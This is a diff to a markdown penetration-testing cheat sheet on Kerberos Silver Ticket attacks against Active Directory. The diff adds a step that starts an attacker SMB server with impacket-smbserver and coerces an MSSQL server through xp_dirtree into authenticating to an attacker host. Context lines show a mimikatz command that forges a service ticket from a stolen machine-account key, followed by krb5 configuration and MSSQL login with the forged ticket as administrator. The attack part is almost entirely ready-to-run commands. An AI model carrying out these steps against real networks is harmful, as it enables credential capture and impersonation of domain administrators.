@@ -40,7 +40,22 @@ Linux (Add -request to Kerberoast if needed)
 
 ## Steps:
 
-### 1) Create ST
+### 1) Verify if the service you are authenticated runs in the context of the service user. If yes, you can impersonate the administrator!
+
+Create a share directory
+
+    mkdir share
+
+Run your SMB Server
+
+    impacket-smbserver share share -smb2support
+
+Try to authenticate to your SMB Server, then check for verification
+
+    exec xp_dirtree '\\SMB_SERVER_IP\share' (MSSQL Server example)
+    net shares '\\SMB_SERVER_IP\share'
+
+### 2) Create ST
 
 /rc4 take the service account (generally the machine account) hash. /aes128 or /aes256 can be used for AES keys.
 
@@ -69,11 +84,11 @@ MISC
 
     mimikatz "kerberos::golden /sid:CURRENT_USER_SID /domain:DOMAIN_SID /target:TARGET_SERVER /service:TARGET_SERVICE /aes256:COMPUTER_AES256_KEY /user:ANY_USER /ptt"
 
-### 2) After crafting your ST, export the ccache file into krb5ccname
+### 3) After crafting your ST, export the ccache file into krb5ccname
 
     export KRB5CCNAME=Administrator.ccache
 
-### 3) Adjust the krb5.conf by adding the target domain and realm by adding them as new entries with the corresponding format
+### 4) Adjust the krb5.conf by adding the target domain and realm by adding them as new entries with the corresponding format
 
     [realms]
         DOMAIN.LOCAL = {
@@ -88,6 +103,6 @@ MISC
     #192.168.1.45 domain.local    domain.domain.local
     127.0.0.1    domain.local    domain.domain.local
 
-### 4) Authenticate with your crafted Silver Ticket
+### 5) Authenticate with your crafted Silver Ticket
 
     impacket-mssql -k domain.domain.local
